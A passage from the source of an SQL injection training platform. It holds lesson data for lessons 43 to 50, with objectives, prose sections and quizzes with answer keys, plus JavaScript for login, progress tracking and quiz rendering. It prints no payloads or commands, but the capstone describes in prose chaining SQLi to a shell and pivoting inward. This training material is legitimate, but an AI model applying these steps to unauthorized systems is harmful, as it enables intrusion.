                "id": "lesson-43-blockchain-defi-security",
                "title": "Lesson 43: Blockchain and DeFi Security",
                "duration": "120 min",
                "objectives": [
                    "Understand how database interactions occur in the context of smart contracts",
                    "Identify potential injection risks in Decentralized Applications (dApps)",
                    "Analyze the security of blockchain oracle and data feed interactions"
                ],
                "content": {
                    "overview": "This lesson explores the emerging field of security for blockchain and Decentralized Finance (DeFi) applications. While not a direct mapping, we will explore how the concepts of injection and trusting external data apply in this new paradigm.",
                    "sections": [
                        {
                            "title": "Smart Contract Security",
                            "content": "<p>While smart contracts themselves don't use SQL, they often interact with external data sources called 'oracles'. If a smart contract blindly trusts the data coming from an oracle without proper validation, it can be manipulated. This is conceptually similar to a traditional injection attack, where untrusted external data is allowed to influence the logic of a trusted system.</p>",
                            "image": "https://images.unsplash.com/photo-1631603090989-821237a349b8?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is a 'blockchain oracle'?", "options": ["The founder of the blockchain", "A special type of cryptocurrency", "A third-party service that provides external, real-world data to a smart contract", "A security vulnerability"], "correct": 2, "explanation": "Oracles act as the bridge between a blockchain and the outside world. Securing the data feeds from these oracles is a major challenge in DeFi security." }
                    ]
                }
            },
            {
                "id": "lesson-44-forensics-attribution",
                "title": "Lesson 44: Advanced Forensics and Attribution",
                "duration": "120 min",
                "objectives": [
                    "Perform a forensic investigation of a web server and database following an SQLi attack",
                    "Reconstruct the attack timeline using web and database logs",
                    "Collect evidence in a forensically sound manner",
                    "Understand the challenges of attributing an attack to a specific threat actor"
                ],
                "content": {
                    "overview": "This lesson focuses on the 'day after' an SQLi attack. You will learn the principles of digital forensics as they apply to investigating a web application breach, from evidence collection to reconstructing the attacker's every move.",
                    "sections": [
                        {
                            "title": "Reconstructing the Attack",
                            "content": "<p>The goal is to build a detailed timeline. This involves correlating evidence from multiple sources:</p><ul><li><strong>Web Server Access Logs:</strong> Show every request the attacker made, revealing the exact timestamps and payloads they used for enumeration and exploitation.</li><li><strong>Database Logs:</strong> The native audit logs of the database can show exactly what queries were executed, confirming the success of the injection.</li><li><strong>Application Logs:</strong> The application's own logs might contain errors or other clues.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the most valuable source of evidence for reconstructing the exact SQLi payloads an attacker used?", "options": ["The database schema", "The web server's access logs", "A network diagram", "The company's security policy"], "correct": 1, "explanation": "The web server access log contains a record of every single HTTP request, including the full URL and POST body, providing a definitive timeline of the attacker's actions." }
                    ]
                }
            },
            {
                "id": "lesson-45-legal-ethical",
                "title": "Lesson 45: Legal and Ethical Considerations",
                "duration": "120 min",
                "objectives": [
                    "Understand the legal boundaries of penetration testing",
                    "Follow the principles of responsible disclosure when finding vulnerabilities",
                    "Maintain ethical standards during a security assessment"
                ],
                "content": {
                    "overview": "Penetration testing without authorization is illegal. This critical lesson covers the legal and ethical framework that a professional security tester must operate within. We will cover the importance of getting explicit, written permission and the ethics of responsible disclosure.",
                    "sections": [
                        {
                            "title": "Authorization is Everything",
                            "content": "<p>You must *never* perform any kind of security testing on a system you do not have explicit, written permission to test. This is the bright line that separates a professional penetration tester from a criminal attacker. The permission should be in the form of a signed contract that clearly defines the 'Rules of Engagement':</p><ul><li>What systems are in scope.</li><li>What systems are explicitly out of scope.</li><li>What testing times are allowed.</li><li>What types of attacks are permitted (e.g., are DoS attacks allowed?).</li></ul>",
                            "image": "https://images.unsplash.com/photo-1589216532372-1c2a3679003a?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the most important document a penetration tester must have before starting an engagement?", "options": ["A powerful computer", "A copy of `sqlmap`", "A signed contract or statement of work giving them explicit, written permission to test the defined scope", "A list of passwords"], "correct": 2, "explanation": "This legal document is what separates ethical hacking from a criminal act." }
                    ]
                }
            },
            {
                "id": "lesson-46-bug-bounty-sqli",
                "title": "Lesson 46: Bug Bounty SQLi Hunting",
                "duration": "120 min",
                "objectives": [
                    "Understand the landscape of public bug bounty platforms (HackerOne, Bugcrowd)",
                    "Learn to write high-quality vulnerability reports that get rewarded",
                    "Develop effective proof-of-concept (PoC) code to demonstrate impact"
                ],
                "content": {
                    "overview": "Bug bounty programs provide a legal and financially rewarding way to practice your skills on real-world applications. This lesson covers how to get started in the world of bug bounty hunting, with a focus on how to find and report SQLi vulnerabilities for a reward.",
                    "sections": [
                        {
                            "title": "Writing a Quality Report",
                            "content": "<p>A high-quality report is the key to a good bounty. It should be clear, concise, and professional.</p><h3>The Perfect Report:</h3><ul><li><strong>Clear Title:</strong> (e.g., 'SQL Injection in `productID` parameter allows database dump').</li><li><strong>Vulnerability Type:</strong> (SQL Injection).</li><li><strong>Detailed Steps to Reproduce:</strong> Provide the exact, step-by-step instructions and HTTP requests needed for the company's security team to reproduce the vulnerability.</li><li><strong>Impact Statement:</strong> Clearly explain the business impact of the vulnerability.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the most important part of a bug bounty submission?", "options": ["A cool title", "A detailed, step-by-step proof of concept that allows the security team to quickly reproduce and validate your finding", "Your opinion about the application's user interface", "A request for a higher bounty"], "correct": 1, "explanation": "A clear, reproducible PoC is essential. If the security team can't reproduce your bug, they can't fix it, and they can't pay you for it." }
                    ]
                }
            },
            {
                "id": "lesson-47-enterprise-assessment",
                "title": "Lesson 47: Enterprise Security Assessment",
                "duration": "120 min",
                "objectives": [
                    "Develop a methodology for assessing large-scale enterprise applications",
                    "Manage the logistics of a multi-person testing team",
                    "Prioritize findings based on enterprise risk",
                    "Present findings effectively to an executive audience"
                ],
                "content": {
                    "overview": "Testing a massive, sprawling enterprise application is different from testing a small website. This lesson covers the strategic considerations for performing a large-scale security assessment, from planning and scoping to reporting.",
                    "sections": [
                        {
                            "title": "Scoping and Strategy",
                            "content": "<p>For a large application, you cannot test every single parameter on every page. You must use a risk-based approach. Work with the client to identify the most critical business functions and data stores (the 'crown jewels'). Focus your manual testing efforts on these high-risk areas, and use automated scanning for broader coverage of the less critical parts of the application.</p>",
                            "image": "https://images.unsplash.com/photo-1542626991-cbc4e32524cc?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "When assessing a very large enterprise application, what is the best strategy?", "options": ["Test everything manually", "Only use an automated scanner", "Use a risk-based approach, focusing intensive manual testing on the most critical parts of the application ('crown jewels')", "Test only the login page"], "correct": 2, "explanation": "A risk-based approach ensures that you use your limited time and resources to find the most impactful vulnerabilities in the most sensitive areas of the application." }
                    ]
                }
            },
            {
                "id": "lesson-48-training-knowledge-transfer",
                "title": "Lesson 48: Training and Knowledge Transfer",
                "duration": "120 min",
                "objectives": [
                    "Develop a secure coding training session for developers focused on SQLi prevention",
                    "Create a 'security champions' program to embed security knowledge in development teams",
                    "Run SQLi awareness campaigns to improve the organization's security culture"
                ],
                "content": {
                    "overview": "Finding and fixing vulnerabilities is only one part of the solution. The ultimate goal is to empower developers to write secure code from the start. This lesson covers how to translate your security knowledge into effective training and awareness programs for developers.",
                    "sections": [
                        {
                            "title": "Developer Training",
                            "content": "<p>The best training is hands-on. Instead of just showing developers a slide deck, have them perform a real SQLi attack in a safe lab environment (like the one you set up in Lesson 2). Then, show them the vulnerable line of code and have them fix it using parameterized queries. This active learning approach is far more memorable and effective than a passive lecture.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is a 'security champions' program?", "options": ["A list of the top security professionals", "A program where developers with an interest in security are given extra training to act as security advocates and first points of contact within their own development teams", "A competition to see who can find the most vulnerabilities", "A new type of WAF"], "correct": 1, "explanation": "Security champions programs are a key way to scale security in a large organization by decentralizing security expertise and embedding it within the development culture." }
                    ]
                }
            },
            {
                "id": "lesson-49-advanced-research-project",
                "title": "Lesson 49: Advanced Research Project",
                "duration": "180 min",
                "objectives": [
                    "Conduct original research on a novel SQLi technique or defense",
                    "Develop a new, custom tool to solve a specific SQLi challenge",
                    "Write a professional-quality white paper on your research"
                ],
                "content": {
                    "overview": "This pre-capstone project allows you to specialize and go deep on a specific area of SQLi that interests you. You will conduct your own original research and produce a tool or a paper that contributes to the field.",
                    "sections": [
                        {
                            "title": "Project Options",
                            "content": "<p>You will choose one of the following:</p><ul><li><strong>Vulnerability Research:</strong> Pick a lesser-known open-source application and perform a deep code review and dynamic analysis to try and find a 0-day SQLi vulnerability.</li><li><strong>Tool Development:</strong> Create a new tamper script for `sqlmap`, or write a custom Python tool to exploit a complex, multi-step blind SQLi vulnerability.</li><li><strong>Defensive Research:</strong> Analyze a new, emerging database technology and document its security posture against injection attacks.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1507413245164-6160d8298b31?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 100,
                    "questions": [
                        { "id": 1, "question": "The advanced research project is designed to assess your ability to:", "options": ["Follow instructions", "Go beyond the standard curriculum to conduct original, independent work in a specialized area of interest", "Run an automated scanner", "Write a report"], "correct": 1, "explanation": "This project is about demonstrating deep expertise and the ability to create new knowledge, not just consume it." }
                    ]
                }
            },
            {
                "id": "lesson-50-final-capstone-project",
                "title": "Lesson 50: Final Capstone Project",
                "duration": "240 min",
                "objectives": [
                    "Apply the complete SQLi assessment methodology to a complex, multi-stage application",
                    "Test across different database backends and application frameworks",
                    "Produce a professional, enterprise-grade assessment report and remediation plan"
                ],
                "content": {
                    "overview": "The final capstone project is a comprehensive, master's level assessment that requires you to synthesize every skill learned in this program. You will be given access to a complex, multi-application environment with different database backends. Your mission is to perform a full security assessment, find and chain multiple vulnerabilities, and produce a professional report suitable for a major enterprise client.",
                    "sections": [
                        {
                            "title": "The Master's Level Assessment",
                            "content": "<p><strong>The Task:</strong> You are the lead penetration tester hired to assess a company's full suite of web applications. The environment includes a legacy PHP/MySQL marketing site, a modern Java/PostgreSQL REST API, and an internal administrative tool written in Python. Your intelligence suggests that a vulnerability in the legacy site might allow you to pivot and attack the more secure backend API.</p><h3>Your Mission:</h3><ol><li><strong>Black-Box Testing:</strong> Perform a full assessment of all applications.</li><li><strong>Find and Chain Vulnerabilities:</strong> Your goal is to find an initial SQLi foothold, escalate it to gain a shell, and then use your position on the network to find and exploit vulnerabilities in the internal API.</li><li><strong>Professional Report:</strong> Produce a single, comprehensive penetration test report that details all your findings, chains the vulnerabilities together into a narrative, and provides a prioritized, strategic remediation plan for the entire organization.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 100,
                    "questions": [
                        { "id": 1, "question": "The final capstone project is designed to assess your ability to:", "options": ["Answer multiple choice questions", "Write a single firewall rule", "Synthesize knowledge from the entire course to conduct a comprehensive, multi-target, professional-grade security assessment from start to finish", "Restart a web server"], "correct": 2, "explanation": "This project is the ultimate test, requiring you to apply your full knowledge base to solve a complex, realistic, multi-stage security engagement." }
                    ]
                }
            }
        ]
    }
  
      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
